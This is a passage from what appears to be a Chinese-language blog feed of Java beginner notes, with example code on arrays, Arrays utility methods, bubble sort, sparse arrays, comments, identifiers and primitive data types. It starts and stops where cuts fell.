class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arrays = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] reverse = reverse(arrays);</span><br><span class="line">        printArray(reverse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span>[] arrays)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;arrays.length ; i++) &#123;</span><br><span class="line">            System.out.println(arrays[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反转</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] reverse(<span class="keyword">int</span>[] arrays)&#123;</span><br><span class="line">        <span class="keyword">int</span> [] result = <span class="keyword">new</span> <span class="keyword">int</span>[arrays.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>,j=result.length -<span class="number">1</span>; i &lt;arrays.length ; i++,j--) &#123;</span><br><span class="line">            result[i] = arrays[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>多维数组可以看成数组的数组，每一个元素都是一个一维数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[][]= <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">5</span>] <span class="comment">//可以得到一个两行5列的数组</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo07</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] array = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;, &#123;<span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array[i].length; j++) &#123;</span><br><span class="line">                System.out.println(array[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Arrays类"><a href="#Arrays类" class="headerlink" title="Arrays类"></a>Arrays类</h3><p>数组的工具类java.util.Arrays</p><p>由于数组对象本身没有什么方法可以调用但是在javaAPI中提供了一个工具类Arrays供我们使用，通过这个工具类可以对数据对象进行一些基本操作</p><p>详细使用参考JDK帮助文档</p><p>Arrays类中的方法都是静态方法可以直接使用类名来调用，不用使用实例化对象的方式调用</p><p>常用功能：</p><ul><li>给数组赋值：通过fill方法</li><li>给数组排序: 通过sort方法，按照升序</li><li>比较数组：通过equals方法比较数组中元素值是否相等</li><li>查找数组元素：通过 binarySearch方法对排序好的数组进行二分查找工作</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo08</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">133</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">5334</span>,<span class="number">656</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9134234</span>,<span class="number">45645</span>&#125;;</span><br><span class="line">        System.out.println(a); <span class="comment">//[I@7c30a502</span></span><br><span class="line">        <span class="comment">//打印数组元素</span></span><br><span class="line">        <span class="comment">//System.out.println(Arrays.toString(a));</span></span><br><span class="line">        Arrays.sort(a);</span><br><span class="line">        Arrays.fill(a,<span class="number">123</span>);</span><br><span class="line">        Arrays.fill(a,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span>[] a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length ; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == a.length-<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.println(a[i]+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(a[i]+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常用实例"><a href="#常用实例" class="headerlink" title="常用实例"></a>常用实例</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo09</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] a=&#123;<span class="number">1</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">34</span>,<span class="number">74</span>,<span class="number">342233</span>,<span class="number">345345</span>,<span class="number">7453</span>,<span class="number">5645</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        Demo09 b =<span class="keyword">new</span> Demo09();</span><br><span class="line">        <span class="keyword">int</span>[] c=b.sort(a);</span><br><span class="line">        System.out.println(Arrays.toString(c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//比较数组中，两个相邻的元素，如果第一个数比第二个数大，交换位置</span></span><br><span class="line">    <span class="comment">//每一次比较都会产生一个最大或者最小的数字</span></span><br><span class="line">    <span class="comment">//下一轮可以少一次比较</span></span><br><span class="line">    <span class="comment">//一次循环，直到结束</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] a)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;a.length-i ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j =  <span class="number">0</span>; j &lt;a.length -<span class="number">1</span>-i ; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    tmp = a[j];</span><br><span class="line">                    a[j]=a[j+<span class="number">1</span>];</span><br><span class="line">                    a[j+<span class="number">1</span>]=tmp;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h4><p>如果二维数组中很多默认值都是零，那么很多记录本身是没有意义的数据</p><p>解决方法：稀疏数组</p><p>本身算是一种压缩算法</p><p>稀疏数组的处理方式是：</p><ul><li>记录数组一共有多少行多少列，有多少不同值</li><li>把具有不同值的元素和行列以及值存储到一个小规模数组中，从而实现压缩的目的</li></ul><p><img src="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210411164450876.png" class="lazyload" data-srcset="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210411164450876.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210411164450876"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo10</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [][] array1 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">        array1[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        array1[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//输出一下原始数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;输出原始数组======================&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] a: array1 ) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> anInt: a)&#123;</span><br><span class="line">                System.out.print(anInt+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//记录一下有效值的个数</span></span><br><span class="line">        <span class="keyword">int</span> sum =<span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;array1.length ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;array1[i].length ; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(array1[i][j]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    sum ++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;有效记录值为&quot;</span>+sum);</span><br><span class="line">        <span class="comment">//创建一个稀疏数组的数组,并且赋值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[][] array2 = <span class="keyword">new</span> <span class="keyword">int</span>[sum+<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">        array2[<span class="number">0</span>][<span class="number">0</span>] = array1.length;</span><br><span class="line">        array2[<span class="number">0</span>][<span class="number">1</span>] = array1[<span class="number">0</span>].length;</span><br><span class="line">        array2[<span class="number">0</span>][<span class="number">2</span>] = sum;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;array1.length ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;array1[i].length ; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(array1[i][j]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    array2[count][<span class="number">0</span>]=i;</span><br><span class="line">                    array2[count][<span class="number">1</span>]=j;</span><br><span class="line">                    array2[count][<span class="number">2</span>]=array1[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出稀疏数组</span></span><br><span class="line">        System.out.println(<span class="string">&quot;稀疏数组===============&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] a: array2) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> anInt: a) &#123;</span><br><span class="line">                System.out.print(anInt+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 还原回常规数组</span></span><br><span class="line">        System.out.println(<span class="string">&quot;还原成常规数组===============&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span>[][] array3= <span class="keyword">new</span> <span class="keyword">int</span>[array2[<span class="number">0</span>][<span class="number">0</span>]][array2[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; sum+<span class="number">1</span>; i++) &#123;</span><br><span class="line">            array3[array2[i][<span class="number">0</span>]][array2[i][<span class="number">1</span>]]=array2[i][<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] a:array3) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> anInt: a)&#123;</span><br><span class="line">                System.out.print(anInt+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础语法</title>
      <link href="2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释是一种非常好的习惯</p><ul><li><p>单行注释  <code>//</code></p></li><li><p>多行注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">hahahaha</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><p>文档注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> HelloWorld</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> M0th</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h3><p>关键字</p><p><img src="https://www.icode9.com/img/ll/?i=20190222173705548.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjYxNDQ0Nw==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://www.icode9.com/img/ll/?i=20190222173705548.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjYxNDQ0Nw==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Java 关键字及其作用（保留字）"></p><p>Java所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符</p><ul><li>所有的标识符都应该以字母（A-Z或者a-z），美元符($)、或者下划线(_)开始</li><li>首字母之后可以是字母，美元符，下划线，数字的任何字符组合</li><li>不能以关键字作为变量名或者方法名</li><li>标识符是大小写敏感的</li><li>可以中文命名。但是low</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote><p>强类型语言：要求变量的使用要求严格符合规定，所有变量都必须定义后使用</p><p>弱类型语言： 某一个变量被定义类型,该变量可以根据环境变化自动进行转换,不需要经过显性强制转换</p></blockquote><p>java是一种强类型的语言，php、javascript是一种弱类型语言</p><p>java的数据类型氛围两类，基本类型与引用类型</p><p>除了基本类型之外全是引用类型<img src="https://www.linuxidc.com/upload/2016_03/160323090748151.png" class="lazyload" data-srcset="https://www.linuxidc.com/upload/2016_03/160323090748151.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//八大基本数据类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//整数</span></span><br><span class="line">        <span class="keyword">int</span> num1=<span class="number">10</span>; <span class="comment">//大小为 -2137483648-2147483647</span></span><br><span class="line">        <span class="keyword">byte</span> num2=<span class="number">20</span>; <span class="comment">// 大小为 -128-127</span></span><br><span class="line">        <span class="keyword">short</span> num3 = <span class="number">30</span>; <span class="comment">//-32768-32767</span></span><br><span class="line">        <span class="keyword">long</span> num4 = <span class="number">30L</span>; <span class="comment">//Long类型要在数字后面加L -9223372036854775808-9223372036854775807</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//小数： 浮点数</span></span><br><span class="line">        <span class="keyword">float</span> num5 =<span class="number">50.1F</span>; <span class="comment">//float类型要在数字后面加F,4个字节</span></span><br><span class="line">        <span class="keyword">double</span> num6=<span class="number">1.12334</span>; <span class="comment">//8个字节</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//字符</span></span><br><span class="line">        <span class="keyword">char</span> name =<span class="string">&#x27;郭&#x27;</span>; <span class="comment">//两个字节</span></span><br><span class="line">        <span class="comment">//字符串,String 不是关键字,是类,所以String类型是引用数据类型</span></span><br><span class="line">        <span class="comment">//String namea =&quot;M0th“;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//bool值</span></span><br><span class="line">        <span class="keyword">boolean</span> flag =<span class="keyword">true</span>; <span class="comment">//占一位</span></span><br><span class="line">        <span class="keyword">boolean</span> flag1 =<span class="keyword">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拓展 数据类型应用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dome03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 整数拓展： 进制 二进制 十进制 八进制 十六进制</span></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">11</span>;</span><br><span class="line">        <span class="keyword">int</span> i2=<span class="number">011</span>;</span><br><span class="line">        <span class="keyword">int</span> i3=<span class="number">0x11</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        System.out.println(i3);</span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="comment">//浮点数拓展？银行业务怎么表示，比如说钱</span></span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="comment">//有限 舍入误差 离散 大约 接近但是不等于</span></span><br><span class="line">        <span class="comment">//double</span></span><br><span class="line">        <span class="comment">//不能使用浮点数用于比较</span></span><br><span class="line">        <span class="keyword">float</span> f =<span class="number">0.1f</span>;</span><br><span class="line">        <span class="keyword">double</span> d =<span class="number">0.1</span>;</span><br><span class="line">        System.out.println(f==d); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> d1= <span class="number">123456787654356786543f</span>;</span><br><span class="line">        <span class="keyword">float</span> d2=d1+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d1==d2);  <span class="comment">//true</span></span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="comment">//字符拓展</span></span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="keyword">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">char</span> c2 = <span class="string">&#x27;中&#x27;</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println((<span class="keyword">int</span>)c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println((<span class="keyword">int</span>)c2);</span><br><span class="line">        <span class="comment">//所有的字符本质还是数字</span></span><br><span class="line">        <span class="comment">//编码 Unicode表： 97=a 65=A 2个字节 0-65536 E</span></span><br><span class="line">        <span class="comment">//U0000 UFFFF</span></span><br><span class="line">        <span class="keyword">char</span> c3=<span class="string">&#x27;\u0061&#x27;</span>;</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        <span class="comment">//转义字符</span></span><br><span class="line">        <span class="comment">//\t \n....</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello\tWorld&quot;</span>);</span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="comment">//对象拓展</span></span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        String sa = <span class="keyword">new</span> String(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        String sb = <span class="keyword">new</span> String(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        System.out.println(sa==sb); <span class="comment">//flase</span></span><br><span class="line"></span><br><span class="line">        String sc=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        String sd=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        System.out.println(sc==sd); <span class="comment">//true</span></span><br><span class="line">        <span class="comment">//对象从内存分析</span></span><br><span class="line">        <span 